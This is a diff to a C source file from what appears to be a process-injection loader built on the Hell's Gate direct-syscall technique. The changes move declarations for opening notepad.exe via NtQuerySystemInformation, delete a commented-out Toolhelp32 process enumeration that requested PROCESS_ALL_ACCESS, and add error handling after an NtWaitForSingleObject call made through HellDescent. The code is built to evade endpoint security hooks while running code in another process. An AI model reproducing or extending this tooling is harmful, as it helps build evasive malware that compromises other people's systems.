@@ -182,6 +182,12 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 }
 
 int main() {
+	HANDLE							hProcess = NULL;
+	ULONG							uReturnLen1 = NULL,
+									uReturnLen2 = NULL;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
+	NTSTATUS STATUS = 0x00;
+	LPWSTR	szProcessName = L"notepad.exe";
 
 	// Get TEB from current process
 	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
@@ -228,42 +234,6 @@ int main() {
 		return 0x1;
 
 	//--------------------------------------------------------------------------
-	// Enumerate processes
-	/*
-	HANDLE			hSnapShot = NULL;
-	HANDLE			hProcess = NULL;
-	PROCESSENTRY32	Proc = {
-					.dwSize = sizeof(PROCESSENTRY32)
-	};
-	LPWSTR	szProcessName = L"notepad.exe";
-
-	// Create process snapshot
-	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-
-	// Loop through each process in the snapshot
-	Process32First(hSnapShot, &Proc);
-	do {
-		// Compare process with one provided in argument
-		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
-			// Get handle of matching process
-			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
-			printf("Found process\n");
-			if (hProcess == NULL)
-				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
-			break;
-		}
-		// Next process if not matching
-	} while (Process32Next(hSnapShot, &Proc));
-	*/
-	HANDLE							hProcess = NULL;
-	ULONG							uReturnLen1 = NULL,
-									uReturnLen2 = NULL;
-	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
-	NTSTATUS STATUS = 0x00;
-	LPWSTR	szProcessName = L"notepad.exe";
-
-
-
 	// Getting Handle to Remote Process
 
 	// First NtQuerySystemInformation call
@@ -349,7 +319,10 @@ int main() {
 	LARGE_INTEGER Timeout;
 	Timeout.QuadPart = -10000000;
 	HellsGate(Table.NtWaitForSingleObject.wSystemCall);
-	STATUS = HellDescent(hThread, FALSE, &Timeout);
+	if ((STATUS = HellDescent(hThread, FALSE, &Timeout)) != 0) {
+		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
+		return 0x1;
+	}
 
 	return 0;
 }
